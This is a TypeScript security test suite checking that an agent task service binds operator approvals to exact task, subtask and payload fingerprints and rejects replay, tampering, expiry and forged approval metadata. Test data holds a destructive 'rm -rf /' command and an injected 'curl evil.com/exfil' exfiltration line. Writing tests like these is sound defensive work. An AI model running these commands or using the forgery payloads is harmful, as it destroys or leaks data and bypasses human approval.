/**
 * Approval Binding & Scope Hardening Security Regression Suite
 *
 * Verifies strict server-enforced binding between sensitive task actions and operator approvals:
 * - Exact Task ID, Subtask ID, capability, target, and payload binding.
 * - Cryptographic SHA-256 fingerprint verification with canonical key ordering.
 * - Defense against replay, mutation, tampering, expiration, revocation, and concurrent duplicate execution.
 */

import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { mkdtemp, rm } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { TaskService } from '../taskService.js'
import { EventBus } from '../events.js'
import { nullLogger } from '../log.js'
import { computeActionFingerprint } from './approvalBinding.js'
import type { Subtask, TaskApproval } from './types.js'

function createSubtask(overrides: Partial<Subtask> = {}): Subtask {
  return {
    id: overrides.id || `sub-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`,
    taskId: overrides.taskId || 'task-test',
    stepIndex: overrides.stepIndex ?? 0,
    state: overrides.state || 'PENDING',
    title: overrides.title || 'Subtask',
    description: overrides.description || 'Test subtask description',
    priority: overrides.priority ?? 50,
    retries: overrides.retries ?? 0,
    maxRetries: overrides.maxRetries ?? 1,
    dependencies: overrides.dependencies ?? [],
    capability: overrides.capability || 'dev.runScript',
    toolId: overrides.toolId || overrides.capability || 'dev.runScript',
    payload: overrides.payload || {},
  }
}

describe('Approval Scope Hardening & Cryptographic Binding (Security P0)', () => {
  let tmp: string
  let taskService: TaskService

  beforeEach(async () => {
    tmp = await mkdtemp(join(tmpdir(), 'jarvis-approval-sec-'))
    taskService = new TaskService({
      dataDir: tmp,
      bus: new EventBus(),
      log: nullLogger(),
      useMemoryStorage: true,
    })
    await taskService.init()
  })

  afterEach(async () => {
    taskService.stop()
    try {
      await rm(tmp, { recursive: true, force: true, maxRetries: 5, retryDelay: 100 })
    } catch {
      // Ignore transient cleanup errors
    }
  })

  // ==========================================================================
  // Unit Verification: Canonicalization & Deterministic Fingerprinting
  // ==========================================================================
  describe('Canonicalization & Fingerprint Determinism', () => {
    it('generates identical fingerprints regardless of object key order', () => {
      const fp1 = computeActionFingerprint({
        taskId: 'task-100',
        subtaskId: 'sub-1',
        action: 'dev.runScript',
        capability: 'dev.runScript',
        payload: { command: 'npm test', flags: ['--verbose'], env: { NODE_ENV: 'test', PORT: 3000 } },
      })

      const fp2 = computeActionFingerprint({
        taskId: 'task-100',
        subtaskId: 'sub-1',
        action: 'dev.runScript',
        capability: 'dev.runScript',
        payload: { env: { PORT: 3000, NODE_ENV: 'test' }, flags: ['--verbose'], command: 'npm test' },
      })

      expect(fp1).toBe(fp2)
      expect(fp1).toHaveLength(64)
    })

    it('normalizes path separators in targets and payloads', () => {
      const fpWindows = computeActionFingerprint({
        taskId: 'task-100',
        subtaskId: 'sub-1',
        action: 'dev.patchFile',
        payload: { projectPath: 'D:\\Projects\\App\\', filePath: 'src\\main.ts' },
      })

      const fpPosix = computeActionFingerprint({
        taskId: 'task-100',
        subtaskId: 'sub-1',
        action: 'dev.patchFile',
        payload: { projectPath: 'D:/Projects/App', filePath: 'src/main.ts' },
      })

      expect(fpWindows).toBe(fpPosix)
    })

    it('alters the fingerprint when meaningful arguments change', () => {
      const fp1 = computeActionFingerprint({
        taskId: 'task-100',
        subtaskId: 'sub-1',
        action: 'dev.runScript',
        payload: { command: 'echo safe' },
      })

      const fp2 = computeActionFingerprint({
        taskId: 'task-100',
        subtaskId: 'sub-1',
        action: 'dev.runScript',
        payload: { command: 'echo dangerous' },
      })

      expect(fp1).not.toBe(fp2)
    })
  })

  // ==========================================================================
  // 14 Core Security Adversarial Scenarios
  // ==========================================================================
  describe('Adversarial Approval Scope Verification', () => {
    it('1. Same capability, different payload: grant for script A cannot authorize script B', async () => {
      const task = await taskService.createTask({
        title: 'Multi-script task',
        objective: 'Execute safe script then restricted script',
        subtasks: [
          {
            id: 'sub-safe',
            title: 'Run Echo',
            capability: 'dev.runScript',
            toolId: 'dev.runScript',
            payload: { command: 'echo 1' },
          },
          {
            id: 'sub-danger',
            title: 'Run Destructive',
            capability: 'dev.runScript',
            toolId: 'dev.runScript',
            payload: { command: 'rm -rf /' },
          },
        ],
      })

      const subSafe = task.subtasks[0]
      const subDanger = task.subtasks[1]

      // Initial check for subSafe returns requiresPermission
      const preSafe = await (taskService as any).executeSubtask(subSafe, task)
      expect(preSafe.success).toBe(false)
      expect(preSafe.requiresPermission).toBeDefined()

      // Operator grants approval specifically for subSafe
      const approvalSafeId = 'appr-safe-001'
      const fpSafe = computeActionFingerprint({
        taskId: task.id,
        subtaskId: subSafe.id,
        action: 'dev.runScript',
        capability: subSafe.capability,
        payload: subSafe.payload,
      })

      task.requiredApprovals = [
        {
          id: approvalSafeId,
          taskId: task.id,
          subtaskId: subSafe.id,
          action: 'dev.runScript',
          description: 'Permission for echo 1',
          impact: 'Executes arbitrary shell scripts',
          toolId: 'dev.runScript',
          payload: subSafe.payload,
          fingerprint: fpSafe,
          createdAt: Date.now(),
          granted: true,
          resolvedAt: Date.now(),
          resolvedBy: 'user',
        },
      ]

      // Attempting to execute subDanger using the grant for subSafe must fail
      const execDanger = await (taskService as any).executeSubtask(subDanger, task)
      expect(execDanger.success).toBe(false)
      expect(execDanger.requiresPermission).toBeDefined()
      expect(execDanger.requiresPermission.subtaskId).toBe(subDanger.id)
      expect(execDanger.requiresPermission.fingerprint).not.toBe(fpSafe)
    })

    it('2. Same capability, different target: grant for project A cannot authorize project B', async () => {
      const task = await taskService.createTask({
        title: 'Target boundary test',
        objective: 'Test directory targeting',
      })

      const subtaskTargetA: Subtask = createSubtask({
        id: 'sub-proj-a',
        taskId: task.id,
        stepIndex: 0,
        title: 'Patch in authorized project',
        capability: 'dev.patchFile',
        toolId: 'dev.patchFile',
        payload: { projectPath: 'D:\\Projects\\Authorized', filePath: 'index.ts', replacement: 'ok' },
      })

      const subtaskTargetB: Subtask = createSubtask({
        id: 'sub-proj-b',
        taskId: task.id,
        stepIndex: 1,
        title: 'Patch in unauthorized project',
        capability: 'dev.patchFile',
        toolId: 'dev.patchFile',
        payload: { projectPath: 'D:\\Projects\\Unauthorized', filePath: 'index.ts', replacement: 'ok' },
      })

      const fpA = computeActionFingerprint({
        taskId: task.id,
        subtaskId: subtaskTargetA.id,
        action: 'dev.patchFile',
        capability: subtaskTargetA.capability,
        payload: subtaskTargetA.payload,
      })

      // Grant exists for Target A
      task.requiredApprovals = [
        {
          id: 'appr-target-a',
          taskId: task.id,
          subtaskId: subtaskTargetA.id,
          action: 'dev.patchFile',
          description: 'Patch Target A',
          impact: 'Modifies source code',
          toolId: 'dev.patchFile',
          target: 'D:/Projects/Authorized',
          payload: subtaskTargetA.payload,
          fingerprint: fpA,
          createdAt: Date.now(),
          granted: true,
          resolvedAt: Date.now(),
          resolvedBy: 'user',
        },
      ]

      // Dispatch Target B
      const resultB = await (taskService as any).executeSubtask(subtaskTargetB, task)
      expect(resultB.success).toBe(false)
      expect(resultB.requiresPermission).toBeDefined()
    })

    it('3. Same task, different subtask: grant for subtask 1 cannot authorize subtask 2 even with identical payload', async () => {
      const task = await taskService.createTask({
        title: 'Duplicate step task',
        objective: 'Two identical commands',
      })

      const sub1: Subtask = createSubtask({
        id: 'sub-step-1',
        taskId: task.id,
        stepIndex: 0,
        title: 'Run build 1',
        capability: 'dev.runScript',
        toolId: 'dev.runScript',
        payload: { command: 'npm run build' },
      })

      const sub2: Subtask = createSubtask({
        id: 'sub-step-2',
        taskId: task.id,
        stepIndex: 1,
        title: 'Run build 2',
        capability: 'dev.runScript',
        toolId: 'dev.runScript',
        payload: { command: 'npm run build' }, // Exact same payload
      })

      const fp1 = computeActionFingerprint({
        taskId: task.id,
        subtaskId: sub1.id,
        action: 'dev.runScript',
        capability: sub1.capability,
        payload: sub1.payload,
      })

      // Only sub1 is approved
      task.requiredApprovals = [
        {
          id: 'appr-sub-1',
          taskId: task.id,
          subtaskId: sub1.id,
          action: 'dev.runScript',
          description: 'Approve sub 1',
          impact: 'Script execution',
          toolId: 'dev.runScript',
          payload: sub1.payload,
          fingerprint: fp1,
          createdAt: Date.now(),
          granted: true,
          resolvedAt: Date.now(),
          resolvedBy: 'user',
        },
      ]

      // Subtask 2 execution must be denied
      const res2 = await (taskService as any).executeSubtask(sub2, task)
      expect(res2.success).toBe(false)
      expect(res2.requiresPermission).toBeDefined()
    })

    it('4. Different task, same capability: grant from Task A cannot authorize Task B', async () => {
      const taskA = await taskService.createTask({ title: 'Task A', objective: 'A' })
      const taskB = await taskService.createTask({ title: 'Task B', objective: 'B' })

      const subA: Subtask = createSubtask({
        id: 'sub-1',
        taskId: taskA.id,
        stepIndex: 0,
        title: 'Delete file',
        capability: 'system.deleteFile',
        toolId: 'system.deleteFile',
        payload: { path: 'D:\\tmp\\out.log' },
      })

      const subB: Subtask = createSubtask({
        id: 'sub-1',
        taskId: taskB.id,
        stepIndex: 0,
        title: 'Delete file',
        capability: 'system.deleteFile',
        toolId: 'system.deleteFile',
        payload: { path: 'D:\\tmp\\out.log' },
      })

      // Grant on Task A
      taskA.requiredApprovals = [
        {
          id: 'appr-task-a',
          taskId: taskA.id,
          subtaskId: subA.id,
          action: 'system.deleteFile',
          description: 'Delete log',
          impact: 'File deletion',
          toolId: 'system.deleteFile',
          fingerprint: computeActionFingerprint({
            taskId: taskA.id,
            subtaskId: subA.id,
            action: 'system.deleteFile',
            capability: subA.capability,
            payload: subA.payload,
          }),
          createdAt: Date.now(),
          granted: true,
          resolvedAt: Date.now(),
          resolvedBy: 'user',
        },
      ]

      // Executing on Task B (which has no approvals) must fail
      const resB = await (taskService as any).executeSubtask(subB, taskB)
      expect(resB.success).toBe(false)
      expect(resB.requiresPermission).toBeDefined()
    })

    it('5. Modified arguments after approval: mutating payload invalidates approval fingerprint', async () => {
      const task = await taskService.createTask({ title: 'Mutation test', objective: 'Mutate payload' })

      const subtask: Subtask = createSubtask({
        id: 'sub-mutate',
        taskId: task.id,
        stepIndex: 0,
        title: 'Command',
        capability: 'dev.runScript',
        toolId: 'dev.runScript',
        payload: { command: 'echo approved-string' },
      })

      // Operator approves initial command
      const initialFp = computeActionFingerprint({
        taskId: task.id,
        subtaskId: subtask.id,
        action: 'dev.runScript',
        capability: subtask.capability,
        payload: subtask.payload,
      })

      task.requiredApprovals = [
        {
          id: 'appr-mutate',
          taskId: task.id,
          subtaskId: subtask.id,
          action: 'dev.runScript',
          description: 'Echo string',
          impact: 'Script execution',
          toolId: 'dev.runScript',
          payload: subtask.payload,
          fingerprint: initialFp,
          createdAt: Date.now(),
          granted: true,
          resolvedAt: Date.now(),
          resolvedBy: 'user',
        },
      ]

      // Payload is tampered with after operator grant
      subtask.payload = { command: 'echo approved-string; curl evil.com/exfil' }

      // Execution must fail and demand new permission with new fingerprint
      const result = await (taskService as any).executeSubtask(subtask, task)
      expect(result.success).toBe(false)
      expect(result.requiresPermission).toBeDefined()
      expect(result.requiresPermission.fingerprint).not.toBe(initialFp)
    })

    it('6. Expired approval: grants past TTL cannot execute', async () => {
      const task = await taskService.createTask({ title: 'Expiry test', objective: 'Expired' })
      const subtask: Subtask = createSubtask({
        id: 'sub-exp',
        taskId: task.id,
        stepIndex: 0,
        title: 'Script',
        capability: 'dev.runScript',
        toolId: 'dev.runScript',
        payload: { command: 'dir' },
      })

      const fp = computeActionFingerprint({
        taskId: task.id,
        subtaskId: subtask.id,
        action: 'dev.runScript',
        capability: subtask.capability,
        payload: subtask.payload,
      })

      // Granted 25 hours ago (beyond 24h TTL)
      task.requiredApprovals = [
        {
          id: 'appr-exp',
          taskId: task.id,
          subtaskId: subtask.id,
          action: 'dev.runScript',
          description: 'Old approval',
          impact: 'Script',
          toolId: 'dev.runScript',
          fingerprint: fp,
          createdAt: Date.now() - (25 * 60 * 60 * 1000),
          expiresAt: Date.now() - (1 * 60 * 60 * 1000),
          granted: true,
          resolvedAt: Date.now() - (25 * 60 * 60 * 1000),
          resolvedBy: 'user',
        },
      ]

      const res = await (taskService as any).executeSubtask(subtask, task)
      expect(res.success).toBe(false)
      expect(res.requiresPermission).toBeDefined()
    })

    it('7. Rejected approval: explicitly denied grants halt execution', async () => {
      const task = await taskService.createTask({ title: 'Reject test', objective: 'Reject' })
      const subtask: Subtask = createSubtask({
        id: 'sub-rej',
        taskId: task.id,
        stepIndex: 0,
        title: 'Script',
        capability: 'dev.runScript',
        toolId: 'dev.runScript',
        payload: { command: 'dir' },
      })

      const fp = computeActionFingerprint({
        taskId: task.id,
        subtaskId: subtask.id,
        action: 'dev.runScript',
        capability: subtask.capability,
        payload: subtask.payload,
      })

      task.requiredApprovals = [
        {
          id: 'appr-rej',
          taskId: task.id,
          subtaskId: subtask.id,
          action: 'dev.runScript',
          description: 'Denied script',
          impact: 'Script',
          toolId: 'dev.runScript',
          fingerprint: fp,
          createdAt: Date.now(),
          granted: false, // Rejected
          resolvedAt: Date.now(),
          resolvedBy: 'user',
          note: 'Blocked by administrator',
        },
      ]

      const res = await (taskService as any).executeSubtask(subtask, task)
      expect(res.success).toBe(false)
      expect(res.requiresPermission).toBeDefined()
    })

    it('8. Missing approval: sensitive action without approval is safely blocked', async () => {
      const task = await taskService.createTask({ title: 'Missing test', objective: 'Missing' })
      const subtask: Subtask = createSubtask({
        id: 'sub-miss',
        taskId: task.id,
        stepIndex: 0,
        title: 'Delete',
        capability: 'system.deleteFile',
        toolId: 'system.deleteFile',
        payload: { path: 'C:\\test.txt' },
      })

      task.requiredApprovals = []

      const res = await (taskService as any).executeSubtask(subtask, task)
      expect(res.success).toBe(false)
      expect(res.requiresPermission).toBeDefined()
      expect(res.requiresPermission.action).toBe('system.deleteFile')
      expect(res.requiresPermission.fingerprint).toBeDefined()
    })

    it('9. Forged client fingerprint: client-supplied fingerprint in payload or metadata is ignored', async () => {
      const task = await taskService.createTask({
        title: 'Forged fingerprint test',
        objective: 'Try injecting spoofed fingerprint',
        metadata: {
          fingerprint: 'deadbeefcafebabe111122223333444455556666777788889999aaaabbbbcccc',
        },
      })

      const subtask: Subtask = createSubtask({
        id: 'sub-forged',
        taskId: task.id,
        stepIndex: 0,
        title: 'Malicious payload injection',
        capability: 'dev.runScript',
        toolId: 'dev.runScript',
        payload: {
          command: 'dir',
          fingerprint: 'deadbeefcafebabe111122223333444455556666777788889999aaaabbbbcccc',
        },
      })

      const res = await (taskService as any).executeSubtask(subtask, task)
      expect(res.success).toBe(false)
      expect(res.requiresPermission).toBeDefined()
      // Server computed actual cryptographic fingerprint, completely ignoring 'deadbeef...'
      expect(res.requiresPermission.fingerprint).not.toBe('deadbeefcafebabe111122223333444455556666777788889999aaaabbbbcccc')
      expect(res.requiresPermission.fingerprint).toHaveLength(64)
    })

    it('10. Replayed approval ID: consumed approval cannot be re-executed', async () => {
      const task = await taskService.createTask({ title: 'Replay test', objective: 'Replay' })
      const subtask: Subtask = createSubtask({
        id: 'sub-rep',
        taskId: task.id,
        stepIndex: 0,
        title: 'Script',
        capability: 'dev.runScript',
        toolId: 'dev.runScript',
        payload: { command: 'echo run-once' },
      })

      const fp = computeActionFingerprint({
        taskId: task.id,
        subtaskId: subtask.id,
        action: 'dev.runScript',
        capability: subtask.capability,
        payload: subtask.payload,
      })

      const approval: TaskApproval = {
        id: 'appr-one-time',
        taskId: task.id,
        subtaskId: subtask.id,
        action: 'dev.runScript',
        description: 'Run once',
        impact: 'Script',
        toolId: 'dev.runScript',
        fingerprint: fp,
        createdAt: Date.now(),
        granted: true,
        resolvedAt: Date.now(),
        resolvedBy: 'user',
      }
      task.requiredApprovals = [approval]

      // 1. First execution passes authorization and marks approval as consumed
      const res1 = await (taskService as any).executeSubtask(subtask, task)
      expect(res1).toBeDefined()
      expect(approval.consumed).toBe(true)
      expect(approval.consumedAt).toBeDefined()

      // 2. Second execution attempt with consumed approval is rejected
      const res2 = await (taskService as any).executeSubtask(subtask, task)
      expect(res2.success).toBe(false)
      expect(res2.requiresPermission).toBeDefined()
    })

    it('11. Concurrent duplicate dispatch: only one execution consumes the approval', async () => {
      const task = await taskService.createTask({ title: 'Concurrency test', objective: 'Concurrent' })
      const subtask: Subtask = createSubtask({
        id: 'sub-race',
        taskId: task.id,
        stepIndex: 0,
        title: 'Script race',
        capability: 'dev.runScript',
        toolId: 'dev.runScript',
        payload: { command: 'echo race' },
      })

      const fp = computeActionFingerprint({
        taskId: task.id,
        subtaskId: subtask.id,
        action: 'dev.runScript',
        capability: subtask.capability,
        payload: subtask.payload,
      })

      const approval: TaskApproval = {
        id: 'appr-race',
        taskId: task.id,
        subtaskId: subtask.id,
        action: 'dev.runScript',
        description: 'Race check',
        impact: 'Script',
        toolId: 'dev.runScript',
        fingerprint: fp,
        createdAt: Date.now(),
        granted: true,
        resolvedAt: Date.now(),
        resolvedBy: 'user',
      }
      task.requiredApprovals = [approval]

      // Simulate two concurrent dispatch attempts
      const [res1, res2] = await Promise.all([
        (taskService as any).executeSubtask(subtask, task),
        (taskService as any).executeSubtask(subtask, task),
      ])

      // Exactly one succeeds past the permission barrier; the other is rejected as already consumed
      const permissionChecks = [res1.requiresPermission === undefined, res2.requiresPermission === undefined]
      const passedCount = permissionChecks.filter(Boolean).length
      expect(passedCount).toBe(1)
    })

    it('12. Revocation: explicit revocation immediately blocks execution', async () => {
      const task = await taskService.createTask({ title: 'Revocation test', objective: 'Revoke' })
      const subtask: Subtask = createSubtask({
        id: 'sub-rev',
        taskId: task.id,
        stepIndex: 0,
        title: 'Script',
        capability: 'dev.runScript',
        toolId: 'dev.runScript',
        payload: { command: 'dir' },
      })

      const fp = computeActionFingerprint({
        taskId: task.id,
        subtaskId: subtask.id,
        action: 'dev.runScript',
        capability: subtask.capability,
        payload: subtask.payload,
      })

      const approval: TaskApproval = {
        id: 'appr-rev',
        taskId: task.id,
        subtaskId: subtask.id,
        action: 'dev.runScript',
        description: 'To be revoked',
        impact: 'Script',
        toolId: 'dev.runScript',
        fingerprint: fp,
        createdAt: Date.now(),
        granted: true,
        resolvedAt: Date.now(),
        resolvedBy: 'user',
      }
      task.requiredApprovals = [approval]
      await (taskService as any).store.saveTask(task)

      // Revoke the approval
      const revoked = await taskService.revokeAction(task.id, approval.id, 'Security concern')
      expect(revoked).toBe(true)
      const updatedTask = await (taskService as any).store.getTask(task.id)
      expect(updatedTask.requiredApprovals[0].revoked).toBe(true)
      expect(updatedTask.requiredApprovals[0].granted).toBe(false)

      // Execution must fail
      const res = await (taskService as any).executeSubtask(subtask, updatedTask)
      expect(res.success).toBe(false)
      expect(res.requiresPermission).toBeDefined()
    })

    it('13. Resume after action payload mutation: resume rejects altered subtasks', async () => {
      const orchestrator = taskService.getOrchestrator()
      const task = await orchestrator.createTask({
        title: 'Resume mutation test',
        objective: 'Test resume protection',
        subtasks: [
          {
            title: 'Initial command',
            description: 'Run initial command',
            priority: 50,
            dependencies: [],
            capability: 'dev.runScript',
            toolId: 'dev.runScript',
            payload: { command: 'echo initial' },
          },
        ],
      })

      const subtask = task.subtasks[0]
      const initialFp = computeActionFingerprint({
        taskId: task.id,
        subtaskId: subtask.id,
        action: 'dev.runScript',
        capability: subtask.capability,
        payload: subtask.payload,
      })

      // Add granted approval for initial command
      task.requiredApprovals = [
        {
          id: 'appr-res',
          taskId: task.id,
          subtaskId: subtask.id,
          action: 'dev.runScript',
          description: 'Initial',
          impact: 'Script',
          toolId: 'dev.runScript',
          fingerprint: initialFp,
          createdAt: Date.now(),
          granted: true,
          resolvedAt: Date.now(),
          resolvedBy: 'user',
        },
      ]

      // Mutate subtask while in queue/pause
      subtask.payload = { command: 'echo mutated-command' }

      // Execution attempt must detect fingerprint mismatch and refuse to execute
      const res = await (taskService as any).executeSubtask(subtask, task)
      expect(res.success).toBe(false)
      expect(res.requiresPermission).toBeDefined()
      expect(res.requiresPermission.fingerprint).not.toBe(initialFp)
    })

    it('14. Metadata injection attempting to forge approval state is sanitized', async () => {
      const task = await taskService.createTask({
        title: 'Metadata forgery attempt',
        objective: 'Inject malicious authorization state',
        metadata: {
          autoApprove: true,
          authorizedScopes: ['dev.runScript'],
          requiredApprovals: [{ id: 'fake', granted: true }],
          isAuthorized: true,
          grantedApprovals: ['all'],
          fingerprint: 'forged',
        },
      })

      // All protected fields must be stripped from metadata
      expect((task.metadata as any)?.autoApprove).toBeUndefined()
      expect((task.metadata as any)?.authorizedScopes).toBeUndefined()
      expect((task.metadata as any)?.requiredApprovals).toBeUndefined()
      expect((task.metadata as any)?.isAuthorized).toBeUndefined()
      expect((task.metadata as any)?.grantedApprovals).toBeUndefined()
      expect((task.metadata as any)?.fingerprint).toBeUndefined()

      // The task's actual requiredApprovals array starts empty
      expect(task.requiredApprovals).toEqual([])
    })
  })
})
